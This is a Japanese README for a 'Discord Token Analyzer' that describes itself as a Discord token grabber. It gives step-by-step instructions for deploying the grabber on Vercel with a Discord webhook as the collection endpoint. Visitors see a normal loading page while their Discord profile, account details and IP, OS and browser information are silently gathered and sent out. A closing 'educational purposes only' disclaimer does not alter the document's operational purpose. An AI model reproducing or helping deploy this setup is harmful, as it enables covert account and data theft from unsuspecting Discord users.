# Discord Token Analyzer

シンプルで効果的なDiscordトークングラバーです。

## 🚀 Vercelでの簡単デプロイ

### 1. リポジトリの準備
```bash
git add .
git commit -m "Initial commit"
git push origin main
```

### 2. Vercelでデプロイ
1. [Vercel](https://vercel.com) にアクセスしてログイン
2. 「New Project」をクリック
3. GitHubリポジトリを選択
4. 「Deploy」をクリック

### 3. 環境変数の設定
デプロイ後、Vercelダッシュボードで：
1. プロジェクト > Settings > Environment Variables
2. 新しい変数を追加：
   - **Name**: `DISCORD_WEBHOOK_URL`
   - **Value**: あなたのDiscord Webhook URL
3. 「Save」をクリック
4. 「Deployments」タブに移動
5. 最新のデプロイメント右側の「...」> 「Redeploy」をクリック

### 4. token-grabber.jsの設定
**重要**: デプロイ完了後、以下の手順を実行してください：

1. VercelダッシュボードでデプロイされたサイトのURLを確認
   - 例: `https://your-project-name.vercel.app`

2. `token-grabber.js`ファイルを編集：
```javascript
// この行を見つけて
r:'https://your-site.vercel.app'

// あなたの実際のVercel URLに置き換える
r:'https://your-project-name.vercel.app'
```

3. 変更をコミット＆プッシュ：
```bash
git add token-grabber.js
git commit -m "Update site URL"
git push origin main
```

4. Vercelで自動的に再デプロイされます

### 5. Discord Webhook URLの取得方法
1. Discordサーバーの設定を開く
2. 「連携サービス」→「ウェブフック」
3. 「新しいウェブフック」を作成
4. 名前とチャンネルを設定
5. 「ウェブフックURLをコピー」

## 📱 使用方法

1. **全ての設定が完了後**、デプロイされたVercel URLにアクセス
2. 通常のローディングページが表示される
3. バックグラウンドで情報が自動収集・送信される

## ⚙️ 設定確認チェックリスト

- [ ] Vercelでプロジェクトがデプロイされている
- [ ] 環境変数 `DISCORD_WEBHOOK_URL` が設定されている
- [ ] `token-grabber.js` のURLが正しく更新されている
- [ ] Discord Webhookが正常に動作している

## 🔧 トラブルシューティング

### エラー: "Function Runtimes must have a valid version"
- `vercel.json` でランタイムが正しく設定されていることを確認

### Webhook が届かない場合
1. 環境変数が正しく設定されているか確認
2. Discord Webhook URLが有効か確認
3. Vercelで再デプロイを実行

## 🔧 ファイル構成

```
token-post/
├── index.html              # メインページ
├── token-grabber.js        # トークン取得スクリプト
├── api/
│   └── get-webhook-url.js  # API エンドポイント
└── vercel.json            # Vercel設定
```

## 📊 収集される情報

- Discord ユーザープロフィール
- アカウント詳細（Nitro状況、2FA等）
- システム情報（IP、OS、ブラウザ）

## ⚠️ 注意事項

- 教育目的でのみ使用してください
- 適切な権限なしに他人のアカウントにアクセスしないでください
- 法的責任は使用者にあります

## 🎯 特徴

- ✅ Vercel での簡単ホスティング
- ✅ 環境変数での安全な設定
- ✅ レスポンシブデザイン
- ✅ 自動的なデータ収集
- ✅ リアルタイム通知